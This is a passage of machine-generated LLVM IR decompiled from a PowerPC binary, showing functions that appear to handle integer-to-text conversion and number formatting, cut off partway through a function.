dec_label_pc_10009a68:                            ; preds = %dec_label_pc_10009a60
  br label %dec_label_pc_10009a6c

dec_label_pc_10009a6c:                            ; preds = %dec_label_pc_10009a60, %dec_label_pc_10009a58, %dec_label_pc_10009a68
  ret i32 0

dec_label_pc_10009a78:                            ; preds = %dec_label_pc_10009a38
  br i1 %v3_10009a78, label %dec_label_pc_10009a8c, label %dec_label_pc_10009a80

dec_label_pc_10009a80:                            ; preds = %dec_label_pc_10009a44, %dec_label_pc_10009a78
  %v2_10009a80 = load i32, i32* %arg2, align 4
  ret i32 %v2_10009a80

dec_label_pc_10009a8c:                            ; preds = %dec_label_pc_10009a78
  %v3_10009a8c = icmp eq i32 %arg1, 256
  %v2_10009a90 = load i32, i32* %arg2, align 4
  br i1 %v3_10009a8c, label %dec_label_pc_10009a98, label %dec_label_pc_10009aa0

dec_label_pc_10009a98:                            ; preds = %dec_label_pc_10009a8c
  %v1_10009a98 = urem i32 %v2_10009a90, 256
  br label %dec_label_pc_10009aac

dec_label_pc_10009aa0:                            ; preds = %dec_label_pc_10009a8c
  %v3_10009aa0 = icmp eq i32 %arg1, 512
  br i1 %v3_10009aa0, label %dec_label_pc_10009aa8, label %dec_label_pc_10009aac

dec_label_pc_10009aa8:                            ; preds = %dec_label_pc_10009aa0
  %v1_10009aa8 = mul i32 %v2_10009a90, 65536
  %v2_10009aa8 = sdiv i32 %v1_10009aa8, 65536
  br label %dec_label_pc_10009aac

dec_label_pc_10009aac:                            ; preds = %dec_label_pc_10009aa0, %dec_label_pc_10009a98, %dec_label_pc_10009aa8
  %v0_10009aac = phi i32 [ %v2_10009a90, %dec_label_pc_10009aa0 ], [ %v1_10009a98, %dec_label_pc_10009a98 ], [ %v2_10009aa8, %dec_label_pc_10009aa8 ]
  %tmp = icmp slt i32 %v0_10009aac, 0
  %v1_10009ab0 = zext i1 %tmp to i32
  %v2_10009ab0 = ashr i32 %v0_10009aac, 31
  %v3_10009ab0 = and i32 %v2_10009ab0, -2
  %v4_10009ab0 = or i32 %v3_10009ab0, %v1_10009ab0
  ret i32 %v4_10009ab0

; uselistorder directives
  uselistorder i32 %v0_10009aac, { 1, 0 }
  uselistorder i32 %v2_10009a90, { 2, 0, 1 }
  uselistorder i1 %v3_10009a78, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_10009aac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009a80, { 1, 0 }
  uselistorder label %dec_label_pc_10009a6c, { 2, 0, 1 }
}

define i32 @function_10009ab8(i16* %arg1) local_unnamed_addr {
dec_label_pc_10009ab8:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10009ab8 = load i32, i32* @r4, align 4
  %v3_10009ab8 = icmp eq i32 %v0_10009ab8, 256
  br i1 %v3_10009ab8, label %dec_label_pc_10009ac4, label %dec_label_pc_10009acc

dec_label_pc_10009ac4:                            ; preds = %dec_label_pc_10009ab8
  %v0_10009ac4 = load i32, i32* @r6, align 4
  %v1_10009ac4 = trunc i32 %v0_10009ac4 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10009ac4, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10009acc:                            ; preds = %dec_label_pc_10009ab8
  %v3_10009abc = icmp eq i32 %v0_10009ab8, 2048
  br i1 %v3_10009abc, label %dec_label_pc_10009ad4, label %dec_label_pc_10009ae0

dec_label_pc_10009ad4:                            ; preds = %dec_label_pc_10009acc
  %v0_10009ad4 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10009ad4, i32* %tmp2, align 4
  %v0_10009ad8 = load i32, i32* @r6, align 4
  %v3_10009ad8 = add i32 %tmp, 4
  %v4_10009ad8 = inttoptr i32 %v3_10009ad8 to i32*
  store i32 %v0_10009ad8, i32* %v4_10009ad8, align 4
  ret i32 %tmp

dec_label_pc_10009ae0:                            ; preds = %dec_label_pc_10009acc
  %v3_10009acc = icmp eq i32 %v0_10009ab8, 512
  %v0_10009ae4 = load i32, i32* @r6, align 4
  br i1 %v3_10009acc, label %dec_label_pc_10009ae4, label %dec_label_pc_10009aec

dec_label_pc_10009ae4:                            ; preds = %dec_label_pc_10009ae0
  %v1_10009ae4 = trunc i32 %v0_10009ae4 to i16
  store i16 %v1_10009ae4, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10009aec:                            ; preds = %dec_label_pc_10009ae0
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10009ae4, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
}

define i32 @function_10009af4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10009af4:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10009af8 = load i32, i32* %r7.global-to-local, align 4
  %v3_10009af8 = icmp eq i32 %v0_10009af8, 0
  store i1 %v3_10009af8, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_10009af8, -1
  br i1 %tmp13, label %dec_label_pc_10009b28, label %dec_label_pc_10009b08

dec_label_pc_10009b08:                            ; preds = %dec_label_pc_10009af4
  %v0_10009b08 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009b0c = sub i32 0, %v0_10009af8
  store i32 %v1_10009b0c, i32* %r7.global-to-local, align 4
  %tmp14 = icmp sgt i32 %v0_10009b08, -1
  br i1 %tmp14, label %dec_label_pc_10009b28, label %dec_label_pc_10009b14

dec_label_pc_10009b14:                            ; preds = %dec_label_pc_10009b08
  %v0_10009b14 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009b14 = sub i32 0, %v0_10009b14
  %v2_10009b14 = sub i32 -1, %v0_10009b14
  store i32 %v1_10009b14, i32* %r6.global-to-local, align 4
  %v4_10009b14 = icmp uge i32 %v2_10009b14, %v1_10009b14
  %v1_10009b18 = sub i32 -1, %v0_10009b08
  %v3_10009b18 = zext i1 %v4_10009b14 to i32
  %v4_10009b18 = add i32 %v3_10009b18, %v1_10009b18
  store i32 %v4_10009b18, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009b28

dec_label_pc_10009b28:                            ; preds = %dec_label_pc_10009b08, %dec_label_pc_10009af4, %dec_label_pc_10009b14
  %v1_10009b2c = phi i32 [ %v1_10009b0c, %dec_label_pc_10009b14 ], [ %v0_10009af8, %dec_label_pc_10009af4 ], [ %v1_10009b0c, %dec_label_pc_10009b08 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10009b14 ], [ 0, %dec_label_pc_10009af4 ], [ 0, %dec_label_pc_10009b08 ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10009b2c = udiv i32 -1, %v1_10009b2c
  store i32 %v2_10009b2c, i32* %r8.global-to-local, align 4
  %v2_10009b34 = load i32, i32* %r3.global-to-local, align 4
  %v3_10009b34 = inttoptr i32 %v2_10009b34 to i8*
  store i8 0, i8* %v3_10009b34, align 1
  %v0_10009b38 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009b38 = load i32, i32* %r7.global-to-local, align 4
  %v2_10009b38 = mul i32 %v1_10009b38, %v0_10009b38
  %v1_10009b3c = sub i32 0, %v2_10009b38
  store i32 %v1_10009b3c, i32* %r31.global-to-local, align 4
  %v4_10009b40 = icmp eq i32 %v1_10009b38, %v1_10009b3c
  br i1 %v4_10009b40, label %dec_label_pc_10009b48, label %dec_label_pc_10009b50

dec_label_pc_10009b48:                            ; preds = %dec_label_pc_10009b28
  %v1_10009b48 = add i32 %v0_10009b38, 1
  store i32 %v1_10009b48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009b50

dec_label_pc_10009b50:                            ; preds = %dec_label_pc_10009b28, %dec_label_pc_10009b48
  %v0_10009b50 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10009b50, i32* %r12.global-to-local, align 4
  %v0_10009b54 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10009b54, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b58

dec_label_pc_10009b58thread-pre-split:            ; preds = %dec_label_pc_10009bac
  %v0_10009b58.pr = load i32, i32* %r12.global-to-local, align 4
  %v0_10009b5c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10009b5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10009b58

dec_label_pc_10009b58:                            ; preds = %dec_label_pc_10009b58thread-pre-split, %dec_label_pc_10009b50
  %v1_10009ba0 = phi i32 [ %v1_10009b5c.pre, %dec_label_pc_10009b58thread-pre-split ], [ %v1_10009b38, %dec_label_pc_10009b50 ]
  %v1_10009ba4 = phi i32 [ %v0_10009b5c.pre, %dec_label_pc_10009b58thread-pre-split ], [ %v0_10009b54, %dec_label_pc_10009b50 ]
  %v1_10009b74 = phi i32 [ %v0_10009b58.pr, %dec_label_pc_10009b58thread-pre-split ], [ %v0_10009b50, %dec_label_pc_10009b50 ]
  %v3_10009b58 = icmp eq i32 %v1_10009b74, 0
  %v2_10009b5c = udiv i32 %v1_10009ba4, %v1_10009ba0
  br i1 %v3_10009b58, label %dec_label_pc_10009ba0, label %dec_label_pc_10009b64

dec_label_pc_10009b64:                            ; preds = %dec_label_pc_10009b58
  %v2_10009b64 = udiv i32 %v1_10009b74, %v1_10009ba0
  %v2_10009b68 = mul i32 %v2_10009b5c, %v1_10009ba0
  %v2_10009b6c = mul i32 %v2_10009b64, %v1_10009ba0
  %v2_10009b70 = sub i32 %v1_10009ba4, %v2_10009b68
  %v2_10009b74 = sub i32 %v1_10009b74, %v2_10009b6c
  store i32 %v2_10009b64, i32* %r12.global-to-local, align 4
  %v0_10009b7c = load i32, i32* %r31.global-to-local, align 4
  %v2_10009b7c = mul i32 %v0_10009b7c, %v2_10009b74
  %v0_10009b80 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009b80 = mul i32 %v0_10009b80, %v2_10009b74
  %v2_10009b84 = add i32 %v2_10009b7c, %v2_10009b70
  %v2_10009b88 = udiv i32 %v2_10009b84, %v1_10009ba0
  %v2_10009b8c = add i32 %v2_10009b80, %v2_10009b5c
  %v2_10009b90 = mul i32 %v2_10009b88, %v1_10009ba0
  %v2_10009b94 = add i32 %v2_10009b88, %v2_10009b8c
  store i32 %v2_10009b94, i32* %r11.global-to-local, align 4
  %v2_10009b98 = sub i32 %v2_10009b84, %v2_10009b90
  store i32 %v2_10009b98, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009bac

dec_label_pc_10009ba0:                            ; preds = %dec_label_pc_10009b58
  %v2_10009ba0 = mul i32 %v2_10009b5c, %v1_10009ba0
  %v2_10009ba4 = sub i32 %v1_10009ba4, %v2_10009ba0
  store i32 %v2_10009ba4, i32* %r5.global-to-local, align 4
  store i32 %v2_10009b5c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009bac

dec_label_pc_10009bac:                            ; preds = %dec_label_pc_10009b64, %dec_label_pc_10009ba0
  %v1_10009bb4 = phi i32 [ %v2_10009b64, %dec_label_pc_10009b64 ], [ 0, %dec_label_pc_10009ba0 ]
  %v0_10009bb4 = phi i32 [ %v2_10009b94, %dec_label_pc_10009b64 ], [ %v2_10009b5c, %dec_label_pc_10009ba0 ]
  %v0_10009bb8 = phi i32 [ %v2_10009b98, %dec_label_pc_10009b64 ], [ %v2_10009ba4, %dec_label_pc_10009ba0 ]
  %v1_10009bb0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009bb4 = or i32 %v0_10009bb4, %v1_10009bb4
  %v5_10009bb4 = icmp eq i32 %v2_10009bb4, 0
  store i1 %v5_10009bb4, i1* %cr0_eq.global-to-local, align 1
  %v0_10009bbc = load i32, i32* %r3.global-to-local, align 4
  %v1_10009bbc = add i32 %v0_10009bbc, -1
  store i32 %v1_10009bbc, i32* %r3.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10009bb8, 10
  %v1_10009bb8.v2_10009bb0.v = select i1 %tmp15, i32 48, i32 %v1_10009bb0
  %v1_10009bb8.v2_10009bb0 = add i32 %v0_10009bb8, %v1_10009bb8.v2_10009bb0.v
  %extract.t10.extract.t = trunc i32 %v1_10009bb8.v2_10009bb0 to i8
  %v3_10009bcc = inttoptr i32 %v1_10009bbc to i8*
  store i8 %extract.t10.extract.t, i8* %v3_10009bcc, align 1
  %v0_10009bd0 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009bd0, label %dec_label_pc_10009bd4, label %dec_label_pc_10009b58thread-pre-split

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009bac
  %v0_10009bd4 = load i32, i32* @r29, align 4
  %v3_10009bd4 = icmp eq i32 %v0_10009bd4, 0
  br i1 %v3_10009bd4, label %dec_label_pc_10009bd4.dec_label_pc_10009be4_crit_edge, label %dec_label_pc_10009bdc

dec_label_pc_10009bd4.dec_label_pc_10009be4_crit_edge: ; preds = %dec_label_pc_10009bd4
  %v0_10009bec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009be4

dec_label_pc_10009bdc:                            ; preds = %dec_label_pc_10009bd4
  %v2_10009be0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10009be0 = add i32 %v2_10009be0, -1
  %v4_10009be0 = inttoptr i32 %v3_10009be0 to i8*
  store i8 45, i8* %v4_10009be0, align 1
  store i32 %v3_10009be0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009be4

dec_label_pc_10009be4:                            ; preds = %dec_label_pc_10009bd4.dec_label_pc_10009be4_crit_edge, %dec_label_pc_10009bdc
  %v0_10009bec = phi i32 [ %v0_10009bec.pre, %dec_label_pc_10009bd4.dec_label_pc_10009be4_crit_edge ], [ %v3_10009be0, %dec_label_pc_10009bdc ]
  ret i32 %v0_10009bec

; uselistorder directives
  uselistorder i32 %v2_10009b88, { 1, 0 }
  uselistorder i32 %v2_10009b64, { 1, 2, 0 }
  uselistorder i32 %v2_10009b5c, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10009ba0, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10009b38, { 1, 2, 0 }
  uselistorder i32 %v0_10009b38, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr0_eq.global-to-local, { 1, 2, 0 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009be4, { 1, 0 }
  uselistorder label %dec_label_pc_10009bac, { 1, 0 }
  uselistorder label %dec_label_pc_10009b50, { 1, 0 }
  uselistorder label %dec_label_pc_10009b28, { 2, 0, 1 }
}

define i32 @function_10009bf0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10009bf0:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10009bf4 = load i32, i32* @lr, align 4
  store i32 101, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10009c10 = add i32 %tmp, 11
  %v2_10009c10 = inttoptr i32 %v1_10009c10 to i8*
  %v3_10009c10 = load i8, i8* %v2_10009c10, align 1
  %v4_10009c10 = zext i8 %v3_10009c10 to i32
  store i32 %v4_10009c10, i32* %r31.global-to-local, align 4
  %v1_10009c18 = or i32 %v4_10009c10, 32
  store i32 %v1_10009c18, i32* %r0.global-to-local, align 4
  %v1_10009c1c = icmp ult i32 %v1_10009c18, 97
  %v3_10009c1c = icmp eq i32 %v1_10009c18, 97
  store i1 %v1_10009c1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009c1c, i1* %cr7_eq.global-to-local, align 1
  %v1_10009c20 = add i32 %tmp, 4
  %v2_10009c20 = inttoptr i32 %v1_10009c20 to i32*
  %v3_10009c20 = load i32, i32* %v2_10009c20, align 4
  store i32 %v3_10009c20, i32* %r28.global-to-local, align 4
  %v2_10009c24 = load i32, i32* %arg2, align 4
  store i32 %v2_10009c24, i32* %r30.global-to-local, align 4
  br i1 %v3_10009c1c, label %dec_label_pc_10009c2c, label %dec_label_pc_10009c34

dec_label_pc_10009c2c:                            ; preds = %dec_label_pc_10009bf0
  %v1_10009c2c = add nuw nsw i32 %v4_10009c10, 6
  store i32 %v1_10009c2c, i32* %r0.global-to-local, align 4
  %v1_10009c30 = urem i32 %v1_10009c2c, 256
  store i32 %v1_10009c30, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009c34

dec_label_pc_10009c34:                            ; preds = %dec_label_pc_10009bf0, %dec_label_pc_10009c2c
  %v0_10009cec = phi i32 [ %v4_10009c10, %dec_label_pc_10009bf0 ], [ %v1_10009c30, %dec_label_pc_10009c2c ]
  %v1_10009c34 = icmp slt i32 %v2_10009c24, 0
  %v3_10009c34 = icmp eq i32 %v2_10009c24, 0
  store i1 %v1_10009c34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009c34, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10009c24, -1
  br i1 %tmp75, label %dec_label_pc_10009c40, label %dec_label_pc_10009c3c

dec_label_pc_10009c3c:                            ; preds = %dec_label_pc_10009c34
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009c40

dec_label_pc_10009c40:                            ; preds = %dec_label_pc_10009c34, %dec_label_pc_10009c3c
  %v0_10009df844 = phi i32 [ %v2_10009c24, %dec_label_pc_10009c34 ], [ 6, %dec_label_pc_10009c3c ]
  %v1_10009c40 = add i32 %tmp, 12
  %v2_10009c40 = inttoptr i32 %v1_10009c40 to i32*
  %v3_10009c40 = load i32, i32* %v2_10009c40, align 4
  store i32 %v3_10009c40, i32* %r9.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  %v1_10009c4c = and i32 %v3_10009c40, 2
  store i32 %v1_10009c4c, i32* %r0.global-to-local, align 4
  %v3_10009c4c = icmp eq i32 %v1_10009c4c, 0
  br i1 %v3_10009c4c, label %dec_label_pc_10009c5c, label %dec_label_pc_10009c68

dec_label_pc_10009c5c:                            ; preds = %dec_label_pc_10009c40
  %v1_10009c5c = urem i32 %v3_10009c40, 2
  store i32 %v1_10009c5c, i32* %r7.global-to-local, align 4
  %v3_10009c5c = icmp eq i32 %v1_10009c5c, 0
  br i1 %v3_10009c5c, label %dec_label_pc_10009c6c, label %dec_label_pc_10009c68

dec_label_pc_10009c68:                            ; preds = %dec_label_pc_10009c5c, %dec_label_pc_10009c40
  %storemerge = phi i32 [ 43, %dec_label_pc_10009c40 ], [ 32, %dec_label_pc_10009c5c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10009c68 = trunc i32 %storemerge to i8
  store i8 %v6_10009c68, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10009c6c

dec_label_pc_10009c6c:                            ; preds = %dec_label_pc_10009c5c, %dec_label_pc_10009c68
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10009c34, label %dec_label_pc_10009dd0, label %dec_label_pc_10009ce8

dec_label_pc_10009ce8:                            ; preds = %dec_label_pc_10009c6c
  %v1_10009cec = icmp ult i32 %v0_10009cec, 96
  %v2_10009cec = icmp ugt i32 %v0_10009cec, 96
  %v3_10009cec = icmp eq i32 %v0_10009cec, 96
  store i1 %v1_10009cec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009cec, i1* %cr7_eq.global-to-local, align 1
  %v2_10009cf0 = add i32 %tmp, 16
  %v3_10009cf0 = inttoptr i32 %v2_10009cf0 to i32*
  store i32 32, i32* %v3_10009cf0, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10009cec, label %dec_label_pc_10009d14, label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009ce8
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009d14

dec_label_pc_10009d14:                            ; preds = %dec_label_pc_10009ce8, %dec_label_pc_10009d08
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f2d0.292 to i32), i32 8), %dec_label_pc_10009ce8 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f2d0.292 to i32), i32 12), %dec_label_pc_10009d08 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000f2d0.292 to i32), i32* %r9.global-to-local, align 4
  %v2_10009d20 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10009d20, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a1c0

dec_label_pc_10009dd0:                            ; preds = %dec_label_pc_10009c6c
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10009dd4 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10009dd4, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10009e20 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10009df4

dec_label_pc_10009df4:                            ; preds = %dec_label_pc_10009e74.dec_label_pc_10009df4_crit_edge, %dec_label_pc_10009dd0
  %v0_10009df8 = phi i32 [ %v0_10009df8.pre, %dec_label_pc_10009e74.dec_label_pc_10009df4_crit_edge ], [ %v0_10009df844, %dec_label_pc_10009dd0 ]
  %v3_10009df8 = call %1 @__asm_cror(i32 %v0_10009df8, i32 %tmp, i32 %v0_10009df8)
  %v0_10009dfc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009dfc, label %dec_label_pc_10009e10, label %dec_label_pc_10009e24

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009df4
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009e24

dec_label_pc_10009e24:                            ; preds = %dec_label_pc_10009df4, %dec_label_pc_10009e10
  %storemerge2 = phi i32 [ %v1_10009e20, %dec_label_pc_10009e10 ], [ %tmp55, %dec_label_pc_10009df4 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10009e34 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009e34 = add i32 %v0_10009e34, 9
  store i32 %v1_10009e34, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009e50

dec_label_pc_10009e50:                            ; preds = %dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge, %dec_label_pc_10009e24
  %v1_10009e58 = phi i32 [ %v1_10009e58.pre, %dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge ], [ %v1_10009e34, %dec_label_pc_10009e24 ]
  %v0_10009e54 = phi i32 [ %v0_10009e54.pre, %dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge ], [ 0, %dec_label_pc_10009e24 ]
  %v1_10009e50 = phi i32 [ %v1_10009e50.pre, %dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge ], [ 10, %dec_label_pc_10009e24 ]
  %v1_10009e60 = phi i32 [ %v0_10009e50.pre, %dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge ], [ %storemerge2, %dec_label_pc_10009e24 ]
  %v2_10009e50 = udiv i32 %v1_10009e60, %v1_10009e50
  store i32 %v2_10009e50, i32* %r0.global-to-local, align 4
  %v1_10009e54 = add i32 %v0_10009e54, 1
  store i32 %v1_10009e54, i32* %r8.global-to-local, align 4
  %v2_10009e58 = sub i32 %v1_10009e58, %v1_10009e54
  store i32 %v2_10009e58, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10009e50, -10
  store i32 %v2_10009e50, i32* %r10.global-to-local, align 4
  %v2_10009e60 = add i32 %v1_10009e60, 48
  %v1_10009e68 = add i32 %v2_10009e60, %tmp76
  store i32 %v1_10009e68, i32* %r9.global-to-local, align 4
  %v1_10009e6c = trunc i32 %v1_10009e68 to i8
  %v3_10009e6c = inttoptr i32 %v2_10009e58 to i8*
  store i8 %v1_10009e6c, i8* %v3_10009e6c, align 1
  %v0_10009e70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e70 = add i32 %v0_10009e70, -1
  store i32 %v1_10009e70, i32* %ctr.global-to-local, align 4
  %v2_10009e70 = icmp eq i32 %v1_10009e70, 0
  br i1 %v2_10009e70, label %dec_label_pc_10009e74, label %dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge

dec_label_pc_10009e50.dec_label_pc_10009e50_crit_edge: ; preds = %dec_label_pc_10009e50
  %v0_10009e50.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10009e50.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10009e54.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10009e58.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10009e50

dec_label_pc_10009e74:                            ; preds = %dec_label_pc_10009e50
  %v0_10009e74 = load i32, i32* %r7.global-to-local, align 4
  %v1_10009e74 = icmp slt i32 %v0_10009e74, 0
  %v3_10009e74 = icmp eq i32 %v0_10009e74, 0
  store i1 %v1_10009e74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e74, i1* %cr7_eq.global-to-local, align 1
  %v1_10009e78 = add i32 %v0_10009e74, 1
  store i32 %v1_10009e78, i32* %r7.global-to-local, align 4
  br i1 %v3_10009e74, label %dec_label_pc_10009e74.dec_label_pc_10009df4_crit_edge, label %dec_label_pc_10009e80

dec_label_pc_10009e74.dec_label_pc_10009df4_crit_edge: ; preds = %dec_label_pc_10009e74
  %v0_10009df8.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009df4

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009e74
  %v0_10009e80 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009e80 = icmp ult i32 %v0_10009e80, 96
  %v2_10009e80 = icmp ugt i32 %v0_10009e80, 96
  %v3_10009e80 = icmp eq i32 %v0_10009e80, 96
  store i1 %v1_10009e80, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e80, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10009e80, label %dec_label_pc_10009e98, label %dec_label_pc_10009e88

dec_label_pc_10009e88:                            ; preds = %dec_label_pc_10009e80
  %v1_10009e90 = add i32 %v0_10009e80, 32
  store i32 %v1_10009e90, i32* %r0.global-to-local, align 4
  %v1_10009e94 = urem i32 %v1_10009e90, 256
  store i32 %v1_10009e94, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009e98

dec_label_pc_10009e98:                            ; preds = %dec_label_pc_10009e80, %dec_label_pc_10009e88
